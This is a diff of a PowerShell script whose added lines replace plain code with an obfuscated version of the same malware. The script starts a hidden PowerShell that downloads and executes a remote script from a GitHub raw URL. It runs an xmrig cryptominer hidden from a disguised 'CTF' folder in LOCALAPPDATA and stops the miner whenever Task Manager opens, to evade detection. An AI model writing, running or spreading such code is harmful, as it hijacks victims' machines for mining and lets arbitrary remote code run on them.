@@ -1,30 +1,31 @@
-Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "Invoke-Expression (Invoke-REstMethod -Uri `'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt`')"
-$ativoprocess = $false
-$ativotask = $null
+&('S'+'tar'+'t-Process') -FilePath ("po"+"wers"+"hell") -WindowStyle ('H'+'idden') -ArgumentList "Invoke-Expression (Invoke-REstMethod -Uri `'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt`')"
+﻿${pA`TH} = "$env:LOCALAPPDATA\CTF\xmrig.exe"
+${ATIvopRo`cE`Ss} = ${f`A`LSe}
+${aTi`VO`TaSK} = ${n`ULl}
 
-while ($true){
-    Start-Sleep -Seconds 1
+while (${T`Rue}){
+    &('St'+'art-Sl'+'eep') -Seconds 1
     try {
-        Get-Process taskmgr -ErrorAction Stop
-        $ativotask = $true
-        try{Stop-Process -name Xmrig -ErrorAction Stop}
+        .('Ge'+'t-P'+'roce'+'ss') ('task'+'mgr') -ErrorAction ('St'+'op')
+        ${a`T`IVotask} = ${tr`Ue}
+        try{&('Stop'+'-Pro'+'c'+'ess') -name ('xm'+'rig') -ErrorAction ('S'+'top')}
         catch{}
-        $ativoprocess = $false 
+        ${A`TiVop`ROCess} = ${FA`lSe} 
     }
     catch {
-       $ativotask = $false 
+       ${A`TiVoTA`Sk} = ${fa`lse} 
        try{
-            Get-Process Xmrig -ErrorAction Stop
-            $ativoprocess = $true
+            .('Get-'+'Proce'+'ss') ('xm'+'rig') -ErrorAction ('S'+'top')
+            ${atiVOpr`o`CESs} = ${t`RUE}
        }
        catch{
-            if($ativoprocess -eq $false){
-                Start-Process -FilePath "$env:LOCALAPPDATA\CTF\xmrig.exe" -WindowStyle Hidden
-                $ativoprocess = $true
+            if(${a`TIVOp`ROCesS} -eq ${f`Al`Se}){
+                &('S'+'tar'+'t-Process') -FilePath ${p`AtH} -WindowStyle ('H'+'idden')
+                ${a`TIV`OPROcEsS} = ${t`RuE}
             }
             else{
-                $ativoprocess = $false
-                Start-Sleep -Seconds 3
+                ${atI`Vop`Roc`ESs} = ${f`AlSe}
+                &('St'+'a'+'rt-'+'Sleep') -Seconds 3
             }
        }
     }
